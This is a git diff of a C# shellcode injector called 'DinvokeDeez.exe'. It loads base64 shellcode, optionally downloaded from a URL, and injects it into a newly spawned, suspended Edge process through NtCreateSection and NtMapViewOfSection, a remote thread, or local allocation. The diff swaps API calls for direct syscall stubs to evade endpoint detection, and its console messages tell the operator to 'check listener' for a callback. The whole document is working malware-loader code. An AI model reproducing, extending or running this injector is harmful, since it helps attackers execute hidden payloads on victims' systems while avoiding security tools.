@@ -30,36 +30,6 @@ namespace Dinvoke
             return retValue;
 
         }
-        /*
-        public static IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect)
-        {
-            object[] funcargs =
-            {
-                hProcess, lpAddress, dwSize, flAllocationType, flProtect
-            };
-            IntPtr retVal = (IntPtr)DynamicInvoke.Generic.DynamicApiInvoke("kernel32.dll", "VirtualAllocEx", typeof(Delegates.VirtualAllocEx), ref funcargs);
-            return retVal;
-        }
-
-        public static IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId)
-        {
-            object[] funcargs =
-            {
-                lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId
-            };
-            IntPtr retVal = (IntPtr)DynamicInvoke.Generic.DynamicApiInvoke("kernel32.dll", "CreateThread", typeof(Delegates.CreateThread), ref funcargs);
-            return retVal;
-        }
-        public static IntPtr OpenProcess(Data.PE.PE_MANUAL_MAP kernel32Details, uint processAccess, bool bInheritHandle, uint processId)
-        {
-            object[] funcargs =
-            {
-                 processAccess,  bInheritHandle,  processId
-            };
-            IntPtr retValue = (IntPtr)DynamicInvoke.Generic.CallMappedDLLModuleExport(kernel32Details.PEINFO, kernel32Details.ModuleBase, "OpenProcess", typeof(Delegates.OpenProcess), ref funcargs);
-            return retValue;
-        }
-        */
         public static Boolean CreateProcessA(Data.PE.PE_MANUAL_MAP kernel32Details, string lpApplicationName, string lpCommandLine, ref Structs.SECURITY_ATTRIBUTES lpProcessAttributes, ref Structs.SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, Structs.ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref Structs.STARTUPINFO lpStartupInfo, out Structs.PROCESS_INFORMATION lpProcessInformation)
         {
             lpProcessInformation = new Structs.PROCESS_INFORMATION();
@@ -72,74 +42,7 @@ namespace Dinvoke
             lpProcessInformation = (Structs.PROCESS_INFORMATION)funcargs[9];
             return retValue;
         }
-        /*
-        public static UInt32 ZwQueryInformationProcess(IntPtr hProcess, Int32 procInformationClass, ref Structs.PROCESS_BASIC_INFORMATION procInformation, UInt32 ProcInfoLen, ref UInt32 retlen)
-        {
-            object[] funcargs =
-            {
-                hProcess, procInformationClass, procInformation, ProcInfoLen, retlen
-            };
-            UInt32 retValue = (UInt32)DynamicInvoke.Generic.DynamicApiInvoke("ntdll.dll", "ZwQueryInformationProcess", typeof(Delegates.ZwQueryInformationProcess), ref funcargs);
-            procInformation = (Structs.PROCESS_BASIC_INFORMATION)funcargs[2];
-            return retValue;
-        }
-        public static bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesRead)
-        {
-            lpNumberOfBytesRead = IntPtr.Zero;
-            object[] funcargs =
-            {
-                hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesRead
-            };
-            bool retValue = (bool)DynamicInvoke.Generic.DynamicApiInvoke("kernel32.dll", "ReadProcessMemory", typeof(Delegates.ReadProcessMemory), ref funcargs);
-            lpNumberOfBytesRead = (IntPtr)funcargs[4];
-            return retValue;
-        }
-        public static bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten)
-        {
-            lpNumberOfBytesWritten = IntPtr.Zero;
-            object[] funcargs =
-            {
-                hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten
-            };
-            bool retValue = (bool)DynamicInvoke.Generic.DynamicApiInvoke("kernel32.dll", "WriteProcessMemory", typeof(Delegates.WriteProcessMemory), ref funcargs);
-            lpNumberOfBytesWritten = (IntPtr)funcargs[4];
-            return retValue;
-        }
-        public static IntPtr OpenThread(Data.PE.PE_MANUAL_MAP kernel32Details, Structs.ThreadAccess dwDesiredAccess, bool bInheritHandle, int dwThreadId)
-        {
-            object[] funcargs =
-            {
-                dwDesiredAccess, bInheritHandle, dwThreadId
-            };
-            //IntPtr retvalue = (IntPtr)DynamicInvoke.Generic.DynamicApiInvoke("kernel32.dll", "OpenThread", typeof(Delegates.OpenThread), ref funcargs);
-            IntPtr retvalue = (IntPtr)DynamicInvoke.Generic.CallMappedDLLModuleExport(kernel32Details.PEINFO, kernel32Details.ModuleBase, "OpenThread", typeof(Delegates.OpenThread), ref funcargs);
-            return retvalue;
-        }
-        public static Boolean VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flNewProtect, uint lpflOldProtect)
-        {
-            object[] funcargs =
-            {
-                hProcess, lpAddress, dwSize, flNewProtect, lpflOldProtect
-            };
-            Boolean retValue = (Boolean)DynamicInvoke.Generic.DynamicApiInvoke("kernel32.dll", "VirtualProtectEx", typeof(Delegates.VirtualProtectEx), ref funcargs);
-            return retValue;
-        }
-        public static IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData)
-        {
-            object[] funcargs =
-            {
-                pfnAPC, hThread, dwData
-            };
-            IntPtr retValue = (IntPtr)DynamicInvoke.Generic.DynamicApiInvoke("kernel32.dll", "QueueUserAPC", typeof(Delegates.QueueUserAPC), ref funcargs);
-            return retValue;
-        }
-        public static uint ResumeThread(IntPtr hThread)
-        {
-            object[] funcargs = { hThread };
-            uint retValue = (uint)DynamicInvoke.Generic.DynamicApiInvoke("kernel32.dll", "ResumeThread", typeof(Delegates.ResumeThread), ref funcargs);
-            return retValue;
-        }
-        */
+
         public static IntPtr CreateRemoteThread(Data.PE.PE_MANUAL_MAP kernel32Details, IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId)
         {
             lpThreadId = IntPtr.Zero;
@@ -147,7 +50,7 @@ namespace Dinvoke
             {
                 hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId
             };
-            //IntPtr retValue = (IntPtr)DynamicInvoke.Generic.DynamicApiInvoke("kernel32.dll", "CreateRemoteThread", typeof(Delegates.CreateRemoteThread), ref funcargs);
+       
             IntPtr retValue = (IntPtr)DynamicInvoke.Generic.CallMappedDLLModuleExport(kernel32Details.PEINFO, kernel32Details.ModuleBase, "CreateRemoteThread", typeof(Delegates.CreateRemoteThread), ref funcargs);
             lpThreadId = (IntPtr)funcargs[6];
             return retValue;
@@ -167,9 +70,16 @@ namespace Dinvoke
             }
             Dictionary<string, string>  parsedArgs = ParseArgs(args);
 
-            if (!parsedArgs.ContainsKey("/m"))
+            if (parsedArgs.ContainsKey("/h"))
             {
                 Help();
+                return;
+            }
+            if (!parsedArgs.ContainsKey("/m"))
+            {
+                //Help();
+                byte[] buf = PrepareBytes();
+                Mapping(buf);
             }
             else if (parsedArgs["/m"] == "1" && parsedArgs.ContainsKey("/f"))
             {
@@ -196,13 +106,13 @@ namespace Dinvoke
             else if (parsedArgs["/m"] == "3" && parsedArgs.ContainsKey("/f"))
             {
                 byte[] buf = PrepareBytes(parsedArgs["/f"]);
-                Console.WriteLine("[+] Mapping into svchost!");
+                Console.WriteLine("[+] Mapping into Edge!");
                 Mapping(buf);
             }
             else if (parsedArgs["/m"] == "3" && !parsedArgs.ContainsKey("/f"))
             {
                 byte[] buf = PrepareBytes();
-                Console.WriteLine("[+] Mapping into svchost!");
+                Console.WriteLine("[+] Mapping into Edge!");
                 Mapping(buf);
             }
             else 
@@ -216,7 +126,8 @@ namespace Dinvoke
             string help = @"
 [-] Usage: DinvokeDeez.exe
     Mandatory Keys
-    /m => Specifies the injection type. 1 = Local Process Injection, 2 = Remote Process Injection, 3 = Injection via NtCreateSection + NtMapViewOfSection
+    /m => Specifies the injection type. 1 = Local Process Injection, 2 = Remote Process Injection, 3 = Injection via NtCreateSection + NtMapViewOfSection (default)
+          Mapping will use edge, remote process injection uses internet explorer ¯\_(ツ)_/¯
 
     Optional Keys
     /f => Specifies a path to alternative base64 encoded shellcode to inject with. Can be a url too.
@@ -251,6 +162,7 @@ namespace Dinvoke
                     try
                     {
                         buf = Convert.FromBase64String(base64String);
+                        Console.WriteLine("[+] " + buf.Length + " bytes downloaded!");
                         return buf;
                     }
                     catch
@@ -294,7 +206,6 @@ namespace Dinvoke
             Console.WriteLine("[+] Mapping kernel32 to process...");
             Data.PE.PE_MANUAL_MAP kernel32Details = ManualMap.Map.MapModuleToMemory("C:\\Windows\\system32\\kernel32.dll");
             IntPtr handle = VirtualAlloc(kernel32Details, IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
-            //IntPtr handle = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
             Console.WriteLine("[+] Allocated " + buf.Length + " bytes of memory.");
 
             Marshal.Copy(buf, 0, handle, buf.Length);
@@ -322,18 +233,28 @@ namespace Dinvoke
             IntPtr baseaddr = IntPtr.Zero;
             IntPtr regionSizePointer = (IntPtr)buf.Length;
 
-
-            DynamicInvoke.Native.NtAllocateVirtualMemory(handle, ref baseaddr, IntPtr.Zero, ref regionSizePointer, 0x3000, 0x40); //rwx on memory page
+            IntPtr ntAllocateVirtualMemoryStub = ManualMap.Map.GetSyscallStub("NtAllocateVirtualMemory");
+            Delegates.NtAllocateVirtualMemory ntOpenProcess = (Delegates.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(ntAllocateVirtualMemoryStub, typeof(Delegates.NtAllocateVirtualMemory));
+            ntOpenProcess(handle, ref baseaddr, IntPtr.Zero, ref regionSizePointer, 0x3000, 0x40); //rwx on memory page
+            //DynamicInvoke.Native.NtAllocateVirtualMemory(handle, ref baseaddr, IntPtr.Zero, ref regionSizePointer, 0x3000, 0x40); //rwx on memory page
             Console.WriteLine("[+] " + regionSizePointer + " bytes allocated!");
 
             var unmanagedBuffer = Marshal.AllocHGlobal(buf.Length);
             Marshal.Copy(buf, 0, unmanagedBuffer, buf.Length);
             Console.WriteLine("[+] " + buf.Length + " bytes copied!");
-            DynamicInvoke.Native.NtWriteVirtualMemory(handle, baseaddr, unmanagedBuffer, (uint)buf.Length);
+
+            UInt32 bytesWritten = 0;
+            IntPtr ntWriteVirtualMemoryStub = ManualMap.Map.GetSyscallStub("NtWriteVirtualMemory");
+            Delegates.NtWriteVirtualMemory ntWriteVirtualMemory = (Delegates.NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(ntWriteVirtualMemoryStub, typeof(Delegates.NtWriteVirtualMemory));
+            ntWriteVirtualMemory(handle, baseaddr, unmanagedBuffer, (uint)buf.Length, ref bytesWritten);
+            //DynamicInvoke.Native.NtWriteVirtualMemory(handle, baseaddr, unmanagedBuffer, (uint)buf.Length);
             Console.WriteLine("[+] " + buf.Length + " bytes pasted!");
 
             IntPtr hThread = IntPtr.Zero;
-            DynamicInvoke.Native.NtCreateThreadEx(ref hThread, Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED, IntPtr.Zero, handle, baseaddr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
+            IntPtr ntCreateThreadExStub = ManualMap.Map.GetSyscallStub("NtCreateThreadEx");
+            Delegates.NtCreateThreadEx ntCreateThreadEx = (Delegates.NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(ntCreateThreadExStub, typeof(Delegates.NtCreateThreadEx));
+            ntCreateThreadEx(ref hThread, (uint)Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED, IntPtr.Zero, handle, baseaddr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
+            //DynamicInvoke.Native.NtCreateThreadEx(ref hThread, Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED, IntPtr.Zero, handle, baseaddr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
             Console.WriteLine("[*] Check for callback.");
             return;
         }
@@ -346,8 +267,7 @@ namespace Dinvoke
             Structs.SECURITY_ATTRIBUTES lta = new Structs.SECURITY_ATTRIBUTES();
 
             Data.PE.PE_MANUAL_MAP kernel32Details = ManualMap.Map.MapModuleToMemory("C:\\Windows\\system32\\kernel32.dll");
-
-            bool succ = CreateProcessA(kernel32Details, null, "C:\\windows\\system32\\svchost.exe", ref lpa, ref lta, false, Structs.ProcessCreationFlags.CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);
+            bool succ = CreateProcessA(kernel32Details, null, @"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe", ref lpa, ref lta, false, Structs.ProcessCreationFlags.CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);
             if (succ)
             {
                 Console.WriteLine("[+] Process Created");
@@ -365,19 +285,27 @@ namespace Dinvoke
             uint PAGE_READWRITE = 0x04;
             uint PAGE_EXECUTE_READ = 0x20;
 
-            DynamicInvoke.Native.NtCreateSection(ref sectionHandle, SECTION_ALL_ACCESS, IntPtr.Zero, ref maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, IntPtr.Zero); //create section
+            IntPtr ntCreateSectionStub = ManualMap.Map.GetSyscallStub("NtCreateSection");
+            DynamicInvoke.Native.Delegates.NtCreateSection ntCreateSection = (DynamicInvoke.Native.Delegates.NtCreateSection)Marshal.GetDelegateForFunctionPointer(ntCreateSectionStub, typeof(DynamicInvoke.Native.Delegates.NtCreateSection));
+            ntCreateSection(ref sectionHandle, SECTION_ALL_ACCESS, IntPtr.Zero, ref maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, IntPtr.Zero);
+            //DynamicInvoke.Native.NtCreateSection(ref sectionHandle, SECTION_ALL_ACCESS, IntPtr.Zero, ref maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, IntPtr.Zero); //create section
             Console.WriteLine("[+] Local Section crated.");
 
-            DynamicInvoke.Native.NtMapViewOfSection(sectionHandle, Process.GetCurrentProcess().Handle, ref hlocalBaseAddress, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref maxSize, 2, 0, PAGE_READWRITE); //locally mapped
+            IntPtr ntMapViewOfSectionStub = ManualMap.Map.GetSyscallStub("NtMapViewOfSection");
+            DynamicInvoke.Native.Delegates.NtMapViewOfSection ntMapViewOfSection = (DynamicInvoke.Native.Delegates.NtMapViewOfSection)Marshal.GetDelegateForFunctionPointer(ntMapViewOfSectionStub, typeof(DynamicInvoke.Native.Delegates.NtMapViewOfSection));
+            ntMapViewOfSection(sectionHandle, Process.GetCurrentProcess().Handle, out hlocalBaseAddress, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, out maxSize, 2, 0, PAGE_READWRITE);
+            //DynamicInvoke.Native.NtMapViewOfSection(sectionHandle, Process.GetCurrentProcess().Handle, ref hlocalBaseAddress, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref maxSize, 2, 0, PAGE_READWRITE); //locally mapped
             Console.WriteLine("[+] Local mapping made.");
 
-            DynamicInvoke.Native.NtMapViewOfSection(sectionHandle, pi.hProcess, ref hRemoteBaseAddress, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref maxSize, 2, 0, PAGE_EXECUTE_READ); //remote map
+            ntMapViewOfSection(sectionHandle, pi.hProcess, out hRemoteBaseAddress, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, out maxSize, 2, 0, PAGE_EXECUTE_READ);
+            //DynamicInvoke.Native.NtMapViewOfSection(sectionHandle, pi.hProcess, ref hRemoteBaseAddress, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref maxSize, 2, 0, PAGE_EXECUTE_READ); //remote map
             Console.WriteLine("[+] Remote mapping made.");
 
             Marshal.Copy(buf, 0, hlocalBaseAddress, buf.Length);
             Console.WriteLine("[+] " + buf.Length + " bytes copied into local map!");
 
             CreateRemoteThread(kernel32Details, pi.hProcess, IntPtr.Zero, 0, hRemoteBaseAddress, IntPtr.Zero, 0, out lpThreadId);
+
             Console.WriteLine("[+] Thread created, check listener!");
         }
     }
